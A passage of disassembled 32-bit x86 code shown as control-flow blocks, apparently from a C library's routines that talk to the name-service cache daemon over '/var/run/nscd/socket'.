0xb11d395:	push	ebx
0xb11d396:	call	0xb1267db
None
|
|
|
v
0xb11da63:	mov	dword ptr [ebp - 0x6c], 0xffffffff
0xb11da6a:	jmp	0xb11d58c
None
|
|
|
v
0xb11da8d:	mov	eax, dword ptr [ebp + 8]
0xb11da90:	mov	esi, dword ptr [ebp - 0xa0]
0xb11da96:	mov	eax, dword ptr [eax + 0x10]
0xb11da99:	mov	eax, dword ptr [eax]
0xb11da9b:	mov	dword ptr [ebp + edx*8 - 0x38], eax
0xb11da9f:	mov	eax, dword ptr [ebp - 0x6c]
0xb11daa2:	shl	eax, 4
0xb11daa5:	mov	dword ptr [ebp + edx*8 - 0x34], eax
0xb11daa9:	add	esi, eax
0xb11daab:	jmp	0xb11da0b
None
|
|
|
v
0xb11d960:	mov	dword ptr [esi + 8], 2
0xb11d967:	mov	dword ptr [esi + 0xc], 4
0xb11d96e:	jmp	0xb11d761
None
|
|
|
v
0xb11d798:	mov	ecx, dword ptr [ebp + 8]
0xb11d79b:	imul	esi, dword ptr [ebp - 0x6c]
0xb11d79f:	mov	eax, dword ptr [ebp - 0xa8]
0xb11d7a5:	mov	edi, dword ptr [ebp - 0x84]
0xb11d7ab:	add	dword ptr [ebp - 0x9c], esi
0xb11d7b1:	mov	ecx, dword ptr [ecx + 0x10]
0xb11d7b4:	sub	eax, 4
0xb11d7b7:	mov	esi, dword ptr [ebp - 0x94]
0xb11d7bd:	mov	dword ptr [ecx + eax], 0
0xb11d7c4:	mov	eax, dword ptr [ebp + 8]
0xb11d7c7:	test	esi, esi
0xb11d7c9:	mov	eax, dword ptr [eax]
0xb11d7cb:	je	0xb11d998
None
|
|
|
v
0xb11dbb0:	cmp	eax, 1
0xb11dbb3:	sbb	eax, eax
0xb11dbb5:	or	eax, 1
0xb11dbb8:	test	eax, eax
0xb11dbba:	mov	dword ptr [ebx + 0x3a5c], eax
0xb11dbc0:	jle	0xb11d3be
None
|
|
|
v
0xb11dbc6:	jmp	0xb11db8e
None
|
|
|
v
0xb11d877:	mov	eax, dword ptr [ebp + 8]
0xb11d87a:	mov	eax, dword ptr [eax + 4]
0xb11d87d:	mov	dword ptr [eax + ecx], 0
0xb11d884:	mov	eax, dword ptr [ebp - 0x8c]
0xb11d88a:	add	eax, esi
0xb11d88c:	add	eax, dword ptr [ebp - 0x88]
0xb11d892:	cmp	dword ptr [ebp - 0x90], eax
0xb11d898:	jb	0xb11db79
None
|
|
|
v
0xb11dac6:	xor	eax, eax
0xb11dac8:	jmp	0xb11d7b7
None
|
|
|
v
0xb11d4e6:	lea	eax, dword ptr [ebp - 0x58]
0xb11d4e9:	mov	dword ptr [esp + 0xc], eax
0xb11d4ed:	mov	eax, dword ptr [ebp - 0x70]
0xb11d4f0:	mov	dword ptr [esp + 0x10], 0x20
0xb11d4f8:	mov	dword ptr [esp + 8], eax
0xb11d4fc:	mov	eax, dword ptr [ebp - 0x80]
0xb11d4ff:	mov	dword ptr [esp + 4], eax
0xb11d503:	mov	eax, dword ptr [ebp - 0x7c]
0xb11d506:	mov	dword ptr [esp], eax
0xb11d509:	call	0xb1202d0
None
|
|
|
v
0xb11d7d1:	mov	ecx, dword ptr [ebp - 0xa0]
0xb11d7d7:	mov	dword ptr [esp], eax
0xb11d7da:	mov	dword ptr [esp + 8], ecx
0xb11d7de:	mov	ecx, dword ptr [ebp - 0x94]
0xb11d7e4:	mov	dword ptr [esp + 4], ecx
0xb11d7e8:	call	0xb07d0b0
None
|
|
|
v
0xb11d50e:	cmp	eax, 0xff
0xb11d511:	mov	dword ptr [ebp - 0x78], eax
0xb11d514:	je	0xb11dab0
None
|
|
|
v
0xb11d5ad:	mov	edx, dword ptr [edi]
0xb11d5af:	mov	eax, dword ptr [ebp - 0x5c]
0xb11d5b2:	jmp	0xb11d491
None
|
|
|
v
0xb11d81c:	xor	esi, esi
0xb11d81e:	mov	edx, dword ptr [ebp - 0x9c]
0xb11d824:	xor	eax, eax
0xb11d826:	mov	dword ptr [ebp - 0x94], edi
0xb11d82c:	mov	edi, dword ptr [ebp + 8]
0xb11d82f:	shl	ecx, 2
0xb11d832:	mov	dword ptr [ebp - 0x6c], esi
0xb11d835:	mov	esi, dword ptr [ebp - 0x98]
0xb11d83b:	mov	dword ptr [ebp - 0x84], ecx
0xb11d841:	lea	esi, dword ptr [esi]
0xb11d848:	mov	ecx, dword ptr [edi + 4]
0xb11d84b:	mov	dword ptr [ecx + eax], edx
0xb11d84e:	mov	ecx, dword ptr [esi + eax]
0xb11d851:	add	edx, dword ptr [esi + eax]
0xb11d854:	add	eax, 4
0xb11d857:	add	dword ptr [ebp - 0x6c], ecx
0xb11d85a:	cmp	eax, dword ptr [ebp - 0x84]
0xb11d860:	jne	0xb11d848
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b11dbd0
TOTAL BLOCKS :4
0xb11dc3d:	sub	esp, 0x14
0xb11dc40:	lea	esp, dword ptr [ebp - 0xc]
0xb11dc43:	pop	ebx
0xb11dc44:	pop	esi
0xb11dc45:	pop	edi
0xb11dc46:	pop	ebp
0xb11dc47:	ret	
None
|
|
|
v
0xb11dc0c:	add	esi, 5
0xb11dc0f:	mov	ecx, esi
0xb11dc11:	lea	edx, dword ptr [eax + 1]
0xb11dc14:	mov	eax, dword ptr [ebp + 0x1c]
0xb11dc17:	mov	dword ptr [esp + 0x10], eax
0xb11dc1b:	mov	eax, dword ptr [ebp + 0x18]
0xb11dc1e:	mov	dword ptr [esp + 0xc], eax
0xb11dc22:	mov	eax, dword ptr [ebp + 0x14]
0xb11dc25:	mov	dword ptr [esp + 8], eax
0xb11dc29:	mov	eax, dword ptr [ebp + 0x10]
0xb11dc2c:	mov	dword ptr [esp + 4], eax
0xb11dc30:	mov	eax, dword ptr [ebp + 0xc]
0xb11dc33:	mov	dword ptr [esp], eax
0xb11dc36:	mov	eax, edi
0xb11dc38:	call	0xb11d390
None
|
|
|
v
0xb11dbd0:	push	ebp
0xb11dbd1:	mov	edx, dword ptr gs:[0]
0xb11dbd8:	mov	ebp, esp
0xb11dbda:	push	edi
0xb11dbdb:	push	esi
0xb11dbdc:	push	ebx
0xb11dbdd:	call	0xb1267db
None
|
|
|
v
0xb11dbe2:	add	ebx, 0x8d41e
0xb11dbe8:	sub	esp, 0x2c
0xb11dbeb:	mov	edi, dword ptr [ebp + 8]
0xb11dbee:	mov	eax, dword ptr [ebx - 0x10]
0xb11dbf4:	mov	eax, dword ptr [edx + eax]
0xb11dbf7:	mov	eax, dword ptr [eax + 8]
0xb11dbfa:	mov	dword ptr [esp], edi
0xb11dbfd:	and	eax, 0x2000
0xb11dc02:	cmp	eax, 1
0xb11dc05:	sbb	esi, esi
0xb11dc07:	call	0xb07ae80
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b11dcb0
TOTAL BLOCKS :9
0xb11dcfd:	cmp	dword ptr [ebp + 0x10], 0xa
0xb11dd01:	jne	0xb11dd10
None
|
|
|
v
0xb11dcc4:	mov	ecx, 6
0xb11dcc9:	mov	eax, dword ptr [ebp + 0x24]
0xb11dccc:	mov	dword ptr [esp + 0x10], eax
0xb11dcd0:	mov	eax, dword ptr [ebp + 0x20]
0xb11dcd3:	mov	dword ptr [esp + 0xc], eax
0xb11dcd7:	mov	eax, dword ptr [ebp + 0x1c]
0xb11dcda:	mov	dword ptr [esp + 8], eax
0xb11dcde:	mov	eax, dword ptr [ebp + 0x18]
0xb11dce1:	mov	dword ptr [esp + 4], eax
0xb11dce5:	mov	eax, dword ptr [ebp + 0x14]
0xb11dce8:	mov	dword ptr [esp], eax
0xb11dceb:	mov	eax, dword ptr [ebp + 8]
0xb11dcee:	call	0xb11d390
None
|
|
|
v
0xb11dcf8:	cmp	edx, 0x10
0xb11dcfb:	jne	0xb11dd10
None
|
|
|
v
0xb11dcf3:	sub	esp, 0x14
0xb11dcf6:	leave	
0xb11dcf7:	ret	
None
|
|
|
v
0xb11dcc9:	mov	eax, dword ptr [ebp + 0x24]
0xb11dccc:	mov	dword ptr [esp + 0x10], eax
0xb11dcd0:	mov	eax, dword ptr [ebp + 0x20]
0xb11dcd3:	mov	dword ptr [esp + 0xc], eax
0xb11dcd7:	mov	eax, dword ptr [ebp + 0x1c]
0xb11dcda:	mov	dword ptr [esp + 8], eax
0xb11dcde:	mov	eax, dword ptr [ebp + 0x18]
0xb11dce1:	mov	dword ptr [esp + 4], eax
0xb11dce5:	mov	eax, dword ptr [ebp + 0x14]
0xb11dce8:	mov	dword ptr [esp], eax
0xb11dceb:	mov	eax, dword ptr [ebp + 8]
0xb11dcee:	call	0xb11d390
None
|
|
|
v
0xb11dd03:	mov	ecx, 7
0xb11dd08:	jmp	0xb11dcc9
None
|
|
|
v
0xb11dcb0:	push	ebp
0xb11dcb1:	mov	ebp, esp
0xb11dcb3:	sub	esp, 0x28
0xb11dcb6:	mov	edx, dword ptr [ebp + 0xc]
0xb11dcb9:	cmp	edx, 4
0xb11dcbc:	jne	0xb11dcf8
None
|
|
|
v
0xb11dd10:	mov	eax, 0xffffffff
0xb11dd15:	leave	
0xb11dd16:	ret	
None
|
|
|
v
0xb11dcbe:	cmp	dword ptr [ebp + 0x10], 2
0xb11dcc2:	jne	0xb11dcf8
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b11f4c0
TOTAL BLOCKS :13
0xb11f5bc:	cmp	eax, 0xff
0xb11f5bf:	je	0xb11f55e
None
|
|
|
v
0xb11f57f:	mov	eax, dword ptr [esp + 0x2c]
0xb11f583:	lea	ecx, dword ptr [eax + 0x1f4]
0xb11f589:	mov	eax, 0x10624dd3
0xb11f58e:	imul	ecx
0xb11f590:	imul	eax, dword ptr [esp + 0x28], 0xfffffc18
0xb11f598:	sar	ecx, 0x1f
0xb11f59b:	sar	edx, 6
0xb11f59e:	sub	ecx, edx
0xb11f5a0:	mov	esi, ecx
0xb11f5a2:	add	esi, eax
0xb11f5a4:	add	esi, dword ptr [esp + 0x18]
0xb11f5a8:	mov	dword ptr [esp + 8], esi
0xb11f5ac:	mov	dword ptr [esp + 4], 1
0xb11f5b4:	mov	dword ptr [esp], edi
0xb11f5b7:	call	0xb0dcfd0
None
|
|
|
v
0xb11f4ff:	add	esp, 0x3c
0xb11f502:	pop	ebx
0xb11f503:	pop	esi
0xb11f504:	pop	edi
0xb11f505:	pop	ebp
0xb11f506:	ret	
None
|
|
|
v
0xb11f5c1:	jmp	0xb11f4ff
None
|
|
|
v
0xb11f4fa:	cmp	eax, 0xff
0xb11f4fd:	je	0xb11f508
None
|
|
|
v
0xb11f508:	mov	ebp, dword ptr gs:[0]
0xb11f50f:	mov	ecx, dword ptr [ebx - 0xdc]
0xb11f515:	cmp	dword ptr [ebp + ecx], 4
0xb11f51a:	jne	0xb11f4ff
None
|
|
|
v
0xb11f534:	mov	ecx, dword ptr [esp + 0x2c]
0xb11f538:	imul	eax, dword ptr [esp + 0x28], 0x3e8
0xb11f540:	add	eax, esi
0xb11f542:	mov	dword ptr [esp + 0x18], eax
0xb11f546:	lea	eax, dword ptr [ecx + 0x1f4]
0xb11f54c:	mov	ecx, 0x3e8
0xb11f551:	cdq	
0xb11f552:	idiv	ecx
0xb11f554:	add	eax, dword ptr [esp + 0x18]
0xb11f558:	mov	dword ptr [esp + 0x18], eax
0xb11f55c:	jmp	0xb11f5a8
None
|
|
|
v
0xb11f4c0:	push	ebp
0xb11f4c1:	push	edi
0xb11f4c2:	push	esi
0xb11f4c3:	mov	esi, edx
0xb11f4c5:	push	ebx
0xb11f4c6:	call	0xb1267db
None
|
|
|
v
0xb11f56b:	mov	eax, dword ptr [esp + 0x1c]
0xb11f56f:	mov	dword ptr [esp + 4], 0
0xb11f577:	mov	dword ptr [esp], eax
0xb11f57a:	call	0xb0a6ba0
None
|
|
|
v
0xb11f4cb:	add	ebx, 0x8bb35
0xb11f4d1:	sub	esp, 0x3c
0xb11f4d4:	lea	edi, dword ptr [esp + 0x20]
0xb11f4d8:	mov	dword ptr [esp + 0x20], eax
0xb11f4dc:	mov	eax, 0x19
0xb11f4e1:	mov	dword ptr [esp + 8], edx
0xb11f4e5:	mov	dword ptr [esp + 4], 1
0xb11f4ed:	mov	dword ptr [esp], edi
0xb11f4f0:	mov	word ptr [esp + 0x24], ax
0xb11f4f5:	call	0xb0dcfd0
None
|
|
|
v
0xb11f5a8:	mov	dword ptr [esp + 8], esi
0xb11f5ac:	mov	dword ptr [esp + 4], 1
0xb11f5b4:	mov	dword ptr [esp], edi
0xb11f5b7:	call	0xb0dcfd0
None
|
|
|
v
0xb11f55e:	mov	ecx, dword ptr [ebx - 0xdc]
0xb11f564:	cmp	dword ptr [ebp + ecx], 4
0xb11f569:	jne	0xb11f4ff
None
|
|
|
v
0xb11f51c:	lea	eax, dword ptr [esp + 0x28]
0xb11f520:	mov	dword ptr [esp + 4], 0
0xb11f528:	mov	dword ptr [esp], eax
0xb11f52b:	mov	dword ptr [esp + 0x1c], eax
0xb11f52f:	call	0xb0a6ba0
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b11f5d0
TOTAL BLOCKS :36
0xb11f768:	cmp	esi, 0xff
0xb11f76b:	mov	edx, 1
0xb11f770:	je	0xb11f890
None
|
|
|
v
0xb11f5d0:	push	ebp
0xb11f5d1:	mov	ebp, esp
0xb11f5d3:	push	edi
0xb11f5d4:	push	esi
0xb11f5d5:	push	ebx
0xb11f5d6:	call	0xb1267db
None
|
|
|
v
0xb11f7e8:	mov	eax, dword ptr gs:[0]
0xb11f7ee:	mov	ecx, dword ptr [ebx - 0xdc]
0xb11f7f4:	mov	eax, dword ptr [eax + ecx]
0xb11f7f7:	cmp	eax, 4
0xb11f7fa:	je	0xb11f722
None
|
|
|
v
0xb11f832:	mov	eax, dword ptr [ebp - 0x94]
0xb11f838:	mov	dword ptr [ebp - 0x9c], eax
0xb11f83e:	mov	eax, dword ptr [ebp - 0x98]
0xb11f844:	add	eax, 5
0xb11f847:	mov	dword ptr [ebp - 0xa0], eax
0xb11f84d:	mov	eax, 0x1388
0xb11f852:	mov	dword ptr [esp + 8], eax
0xb11f856:	lea	eax, dword ptr [ebp - 0x90]
0xb11f85c:	mov	dword ptr [esp + 4], 1
0xb11f864:	mov	dword ptr [esp], eax
0xb11f867:	mov	dword ptr [ebp - 0x90], esi
0xb11f86d:	mov	word ptr [ebp - 0x8c], 0x1c
0xb11f876:	call	0xb0dcfd0
None
|
|
|
v
0xb11f757:	mov	eax, esi
0xb11f759:	lea	esp, dword ptr [ebp - 0xc]
0xb11f75c:	pop	ebx
0xb11f75d:	pop	esi
0xb11f75e:	pop	edi
0xb11f75f:	pop	ebp
0xb11f760:	ret	
None
|
|
|
v
0xb11f8ea:	mov	eax, dword ptr [ebp - 0x9c]
0xb11f8f0:	mov	ecx, 0x3e8
0xb11f8f5:	sub	eax, dword ptr [ebp - 0x94]
0xb11f8fb:	mov	edi, dword ptr [ebp - 0xa0]
0xb11f901:	sub	edi, dword ptr [ebp - 0x98]
0xb11f907:	cdq	
0xb11f908:	idiv	ecx
0xb11f90a:	imul	edi, edi, 0x3e8
0xb11f910:	add	eax, edi
0xb11f912:	jmp	0xb11f852
None
|
|
|
v
0xb11f80d:	cmp	eax, 0xb
0xb11f810:	jne	0xb11f7c7
None
|
|
|
v
0xb11f87b:	test	eax, eax
0xb11f87d:	jle	0xb11f7c7
None
|
|
|
v
0xb11f812:	lea	eax, dword ptr [ebp - 0x98]
0xb11f818:	mov	dword ptr [esp + 4], 0
0xb11f820:	mov	dword ptr [esp], eax
0xb11f823:	call	0xb0a6ba0
None
|
|
|
v
0xb11f642:	lea	eax, dword ptr [edi + 0xf]
0xb11f645:	mov	ecx, dword ptr [ebx + 0x37e8]
0xb11f64b:	and	eax, 0xfffffffc
0xb11f64e:	add	eax, 0x12
0xb11f651:	and	eax, 0xfffffff0
0xb11f654:	sub	esp, eax
0xb11f656:	lea	edx, dword ptr [esp + 0x13]
0xb11f65a:	shr	edx, 2
0xb11f65d:	test	ecx, ecx
0xb11f65f:	lea	eax, dword ptr [edx*4]
0xb11f666:	mov	dword ptr [ebp - 0xac], eax
0xb11f66c:	lea	eax, dword ptr [edi + 0xc]
0xb11f66f:	mov	dword ptr [ebp - 0xb0], eax
0xb11f675:	js	0xb11f8b0
None
|
|
|
v
0xb11f788:	mov	dword ptr [esp + 8], 0
0xb11f790:	mov	dword ptr [esp + 4], 1
0xb11f798:	mov	dword ptr [esp], 1
0xb11f79f:	call	0xb0ed9f0
None
|
|
|
v
0xb11f883:	xor	edi, edi
0xb11f885:	jmp	0xb11f722
None
|
|
|
v
0xb11f8ce:	mov	edx, dword ptr [ebp - 0xb4]
0xb11f8d4:	jmp	0xb11f67b
None
|
|
|
v
0xb11f7a4:	mov	esi, eax
0xb11f7a6:	jmp	0xb11f63a
None
|
|
|
v
0xb11f890:	mov	edx, dword ptr gs:[0]
0xb11f897:	mov	eax, dword ptr [ebx - 0xdc]
0xb11f89d:	cmp	dword ptr [edx + eax], 0x16
0xb11f8a1:	setne	dl
0xb11f8a4:	movzx	edx, dl
0xb11f8a7:	lea	edx, dword ptr [edx + edx - 1]
0xb11f8ab:	jmp	0xb11f776
None
|
|
|
v
0xb11f776:	mov	dword ptr [ebx + 0x37e8], edx
0xb11f77c:	jmp	0xb11f632
None
|
|
|
v
0xb11f632:	test	edx, edx
0xb11f634:	js	0xb11f788
None
|
|
|
v
0xb11f722:	mov	eax, dword ptr [ebp - 0xb0]
0xb11f728:	mov	dword ptr [esp + 0xc], 0x4000
0xb11f730:	mov	dword ptr [esp], esi
0xb11f733:	mov	dword ptr [esp + 8], eax
0xb11f737:	mov	eax, dword ptr [ebp - 0xac]
0xb11f73d:	mov	dword ptr [esp + 4], eax
0xb11f741:	call	0xb0ed7f0
None
|
|
|
v
0xb11f746:	cmp	eax, 0xff
0xb11f749:	je	0xb11f7e8
None
|
|
|
v
0xb11f604:	mov	dword ptr [esp + 8], 0
0xb11f60c:	mov	dword ptr [esp + 4], 0x80801
0xb11f614:	mov	dword ptr [esp], 1
0xb11f61b:	call	0xb0ed9f0
None
|
|
|
v
0xb11f828:	mov	eax, edi
0xb11f82a:	test	al, al
0xb11f82c:	je	0xb11f8ea
None
|
|
|
v
0xb11f63a:	test	esi, esi
0xb11f63c:	js	0xb11f8e0
None
|
|
|
v
0xb11f7c7:	mov	ecx, esi
0xb11f7c9:	xchg	ebx, ecx
0xb11f7cb:	mov	eax, 6
0xb11f7d0:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb11f852:	mov	dword ptr [esp + 8], eax
0xb11f856:	lea	eax, dword ptr [ebp - 0x90]
0xb11f85c:	mov	dword ptr [esp + 4], 1
0xb11f864:	mov	dword ptr [esp], eax
0xb11f867:	mov	dword ptr [ebp - 0x90], esi
0xb11f86d:	mov	word ptr [ebp - 0x8c], 0x1c
0xb11f876:	call	0xb0dcfd0
None
|
|
|
v
0xb11f7d7:	xchg	ebx, ecx
0xb11f7d9:	mov	eax, 0xffffffff
0xb11f7de:	jmp	0xb11f759
None
|
|
|
v
0xb11f6df:	mov	eax, dword ptr [ebp - 0xb8]
0xb11f6e5:	mov	ecx, dword ptr [ebp - 0xbc]
0xb11f6eb:	mov	dword ptr [edx*4 + 8], edi
0xb11f6f2:	mov	dword ptr [edx*4], 2
0xb11f6fd:	mov	dword ptr [edx*4 + 4], eax
0xb11f704:	mov	eax, dword ptr [ebp - 0xac]
0xb11f70a:	mov	dword ptr [esp + 8], edi
0xb11f70e:	mov	edi, 1
0xb11f713:	mov	dword ptr [esp + 4], ecx
0xb11f717:	add	eax, 0xc
0xb11f71a:	mov	dword ptr [esp], eax
0xb11f71d:	call	0xb07d0b0
None
|
|
|
v
0xb11f759:	lea	esp, dword ptr [ebp - 0xc]
0xb11f75c:	pop	ebx
0xb11f75d:	pop	esi
0xb11f75e:	pop	edi
0xb11f75f:	pop	ebp
0xb11f760:	ret	
None
|
|
|
v
0xb11f8b0:	mov	dword ptr [esp + 8], 0x802
0xb11f8b8:	mov	dword ptr [esp + 4], 4
0xb11f8c0:	mov	dword ptr [esp], esi
0xb11f8c3:	mov	dword ptr [ebp - 0xb4], edx
0xb11f8c9:	call	0xb0db490
None
|
|
|
v
0xb11f800:	cmp	dword ptr [ebp - 0xb0], -1
0xb11f807:	je	0xb11f757
None
|
|
|
v
0xb11f620:	mov	esi, eax
0xb11f622:	mov	eax, dword ptr [ebx + 0x37e8]
0xb11f628:	test	eax, eax
0xb11f62a:	mov	edx, eax
0xb11f62c:	je	0xb11f768
None
|
|
|
v
0xb11f7b0:	mov	eax, dword ptr [ebx - 0xdc]
0xb11f7b6:	mov	ecx, dword ptr gs:[0]
0xb11f7bd:	cmp	dword ptr [ecx + eax], 0x73
0xb11f7c1:	je	0xb11f6df
None
|
|
|
v
0xb11f8e0:	mov	eax, 0xffffffff
0xb11f8e5:	jmp	0xb11f759
None
|
|
|
v
0xb11f74f:	cmp	eax, dword ptr [ebp - 0xb0]
0xb11f755:	jne	0xb11f7c7
None
|
|
|
v
0xb11f5db:	add	ebx, 0x8ba25
0xb11f5e1:	sub	esp, 0xcc
0xb11f5e7:	mov	edi, dword ptr [ebp + 8]
0xb11f5ea:	mov	dword ptr [ebp - 0xb8], eax
0xb11f5f0:	mov	dword ptr [ebp - 0xbc], edx
0xb11f5f6:	mov	esi, dword ptr [ebx + 0x37e8]
0xb11f5fc:	test	esi, esi
0xb11f5fe:	js	0xb11f788
None
|
|
|
v
0xb11f6d1:	mov	edx, dword ptr [ebp - 0xb4]
0xb11f6d7:	test	eax, eax
0xb11f6d9:	js	0xb11f7b0
None
|
|
|
v
0xb11f67b:	mov	eax, 1
0xb11f680:	mov	word ptr [ebp - 0x86], ax
0xb11f687:	lea	eax, dword ptr [ebp - 0x86]
0xb11f68d:	mov	dword ptr [esp + 8], 0x6e
0xb11f695:	mov	dword ptr [esp + 4], eax
0xb11f699:	mov	dword ptr [esp], esi
0xb11f69c:	mov	dword ptr [ebp - 0xb4], edx
0xb11f6a2:	mov	dword ptr [ebp - 0x84], 0x7261762f
0xb11f6ac:	mov	dword ptr [ebp - 0x80], 0x6e75722f
0xb11f6b3:	mov	dword ptr [ebp - 0x7c], 0x63736e2f
0xb11f6ba:	mov	dword ptr [ebp - 0x78], 0x6f732f64
0xb11f6c1:	mov	dword ptr [ebp - 0x74], 0x74656b63
0xb11f6c8:	mov	byte ptr [ebp - 0x70], 0
0xb11f6cc:	call	0xb0ed4f0
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b11f920
TOTAL BLOCKS :16
0xb11f985:	cmp	eax, 0xb
0xb11f988:	je	0xb11f9a3
None
|
|
|
v
0xb11f960:	mov	eax, dword ptr [esp + 0x38]
0xb11f964:	sub	eax, ebp
0xb11f966:	add	esp, 0x1c
0xb11f969:	pop	ebx
0xb11f96a:	pop	esi
0xb11f96b:	pop	edi
0xb11f96c:	pop	ebp
0xb11f96d:	ret	
None
|
|
|
v
0xb11f966:	add	esp, 0x1c
0xb11f969:	pop	ebx
0xb11f96a:	pop	esi
0xb11f96b:	pop	edi
0xb11f96c:	pop	ebp
0xb11f96d:	ret	
None
|
|
|
v
0xb11f94e:	cmp	eax, 0xff
0xb11f951:	mov	esi, eax
0xb11f953:	je	0xb11f970
None
|
|
|
v
0xb11f990:	je	0xb11f960
None
|
|
|
v
0xb11f992:	mov	eax, dword ptr gs:[0]
0xb11f998:	mov	ecx, dword ptr [ebx - 0xdc]
0xb11f99e:	mov	eax, dword ptr [eax + ecx]
0xb11f9a1:	jmp	0xb11f985
None
|
|
|
v
0xb11f9b5:	mov	eax, esi
0xb11f9b7:	jmp	0xb11f966
None
|
|
|
v
0xb11f970:	mov	eax, dword ptr [ebx - 0xdc]
0xb11f976:	mov	edx, dword ptr gs:[0]
0xb11f97d:	mov	eax, dword ptr [edx + eax]
0xb11f980:	cmp	eax, 4
0xb11f983:	je	0xb11f93a
None
|
|
|
v
0xb11f955:	cmp	eax, 0
0xb11f958:	jle	0xb11f990
None
|
|
|
v
0xb11f98a:	mov	eax, esi
0xb11f98c:	jmp	0xb11f966
None
|
|
|
v
0xb11f920:	push	ebp
0xb11f921:	push	edi
0xb11f922:	push	esi
0xb11f923:	push	ebx
0xb11f924:	call	0xb1267db
None
|
|
|
v
0xb11f929:	add	ebx, 0x8b6d7
0xb11f92f:	sub	esp, 0x1c
0xb11f932:	mov	edi, dword ptr [esp + 0x34]
0xb11f936:	mov	ebp, dword ptr [esp + 0x38]
0xb11f93a:	mov	eax, dword ptr [esp + 0x30]
0xb11f93e:	mov	dword ptr [esp + 8], ebp
0xb11f942:	mov	dword ptr [esp + 4], edi
0xb11f946:	mov	dword ptr [esp], eax
0xb11f949:	call	0xb0daf60
None
|
|
|
v
0xb11f9b1:	test	eax, eax
0xb11f9b3:	jg	0xb11f93a
None
|
|
|
v
0xb11f95a:	add	edi, eax
0xb11f95c:	sub	ebp, eax
0xb11f95e:	jne	0xb11f93a
None
|
|
|
v
0xb11f9a3:	mov	eax, dword ptr [esp + 0x30]
0xb11f9a7:	mov	edx, 0xc8
0xb11f9ac:	call	0xb11f4c0
None
|
|
|
v
0xb11f93a:	mov	eax, dword ptr [esp + 0x30]
0xb11f93e:	mov	dword ptr [esp + 8], ebp
0xb11f942:	mov	dword ptr [esp + 4], edi
0xb11f946:	mov	dword ptr [esp], eax
0xb11f949:	call	0xb0daf60
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b11f9c0
TOTAL BLOCKS :36
0xb11fa58:	mov	dword ptr [ebp - 0x24], ecx
0xb11fa5b:	mov	ecx, dword ptr [ebp - 0x20]
0xb11fa5e:	mov	dword ptr [ebp - 0x1c], esp
0xb11fa61:	mov	eax, ecx
0xb11fa63:	add	eax, 0x12
0xb11fa66:	and	eax, 0xfffffff0
0xb11fa69:	sub	esp, eax
0xb11fa6b:	lea	eax, dword ptr [esp + 0xc]
0xb11fa6f:	mov	dword ptr [esp + 8], ecx
0xb11fa73:	mov	dword ptr [esp + 4], esi
0xb11fa77:	mov	dword ptr [esp], eax
0xb11fa7a:	call	0xb07d0b0
None
|
|
|
v
0xb11fa9c:	mov	eax, dword ptr [ebp + 0x10]
0xb11fa9f:	mov	dword ptr [esp + 4], edi
0xb11faa3:	mov	dword ptr [esp + 8], eax
0xb11faa7:	mov	eax, dword ptr [ebp + 8]
0xb11faaa:	mov	dword ptr [esp], eax
0xb11faad:	call	0xb0e3130
None
|
|
|
v
0xb11fab2:	cmp	eax, 0xff
0xb11fab5:	mov	esi, eax
0xb11fab7:	je	0xb11fafb
None
|
|
|
v
0xb11fb71:	jmp	0xb11fb15
None
|
|
|
v
0xb11fa4d:	lea	esp, dword ptr [ebp - 0xc]
0xb11fa50:	mov	eax, ecx
0xb11fa52:	pop	ebx
0xb11fa53:	pop	esi
0xb11fa54:	pop	edi
0xb11fa55:	pop	ebp
0xb11fa56:	ret	
None
|
|
|
v
0xb11fac9:	mov	esp, dword ptr [ebp - 0x1c]
0xb11facc:	lea	esp, dword ptr [ebp - 0xc]
0xb11facf:	mov	eax, ecx
0xb11fad1:	pop	ebx
0xb11fad2:	pop	esi
0xb11fad3:	pop	edi
0xb11fad4:	pop	ebp
0xb11fad5:	ret	
None
|
|
|
v
0xb11faf0:	sub	esi, eax
0xb11faf2:	add	ecx, 8
0xb11faf5:	sub	dword ptr [ebp + 0x10], 1
0xb11faf9:	jmp	0xb11fa8c
None
|
|
|
v
0xb11fb4b:	mov	eax, dword ptr gs:[0]
0xb11fb51:	mov	ecx, dword ptr [ebx - 0xdc]
0xb11fb57:	mov	eax, dword ptr [eax + ecx]
0xb11fb5a:	jmp	0xb11fb10
None
|
|
|
v
0xb11fab9:	cmp	eax, 0
0xb11fabc:	jg	0xb11fb20
None
|
|
|
v
0xb11fabe:	nop	
0xb11fac0:	jne	0xb11fb4b
None
|
|
|
v
0xb11fa20:	mov	edi, dword ptr [ebp + 0x10]
0xb11fa23:	mov	eax, esi
0xb11fa25:	xor	edx, edx
0xb11fa27:	mov	dword ptr [ebp - 0x1c], ecx
0xb11fa2a:	shl	edi, 3
0xb11fa2d:	mov	dword ptr [ebp - 0x20], edi
0xb11fa30:	add	edi, esi
0xb11fa32:	mov	ecx, edi
0xb11fa34:	lea	esi, dword ptr [esi]
0xb11fa38:	mov	edi, dword ptr [eax + 4]
0xb11fa3b:	add	eax, 8
0xb11fa3e:	add	edi, edx
0xb11fa40:	cmp	eax, ecx
0xb11fa42:	mov	edx, edi
0xb11fa44:	jne	0xb11fa38
None
|
|
|
v
0xb11f9cb:	add	ebx, 0x8b635
0xb11f9d1:	sub	esp, 0x2c
0xb11f9d4:	mov	esi, dword ptr [ebp + 0xc]
0xb11f9d7:	mov	edi, dword ptr [ebx - 0xdc]
0xb11f9dd:	jmp	0xb11f9f3
None
|
|
|
v
0xb11fa8c:	mov	eax, dword ptr [ecx + 4]
0xb11fa8f:	cmp	eax, esi
0xb11fa91:	jbe	0xb11faf0
None
|
|
|
v
0xb11fb31:	jmp	0xb11fac6
None
|
|
|
v
0xb11f9e0:	mov	edx, dword ptr gs:[0]
0xb11f9e7:	mov	edx, dword ptr [edx + edi]
0xb11f9ea:	cmp	edx, 4
0xb11f9ed:	jne	0xb11fad8
None
|
|
|
v
0xb11fae5:	xor	ecx, ecx
0xb11fae7:	jmp	0xb11fa19
None
|
|
|
v
0xb11fa19:	mov	eax, dword ptr [ebp + 0x10]
0xb11fa1c:	test	eax, eax
0xb11fa1e:	jle	0xb11fa4d
